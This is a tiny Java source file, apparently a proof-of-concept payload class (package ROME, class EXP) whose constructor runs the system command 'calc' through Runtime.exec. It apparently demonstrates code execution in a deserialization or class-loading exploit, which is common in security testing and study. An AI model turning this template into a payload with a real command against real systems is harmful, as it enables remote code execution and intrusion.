package ROME;

public class EXP
{
    public EXP()
    {
        try
        {
            Runtime.getRuntime().exec("calc");
        }
        catch (Exception e)
        {
            e.printStackTrace();
        }
    }
}
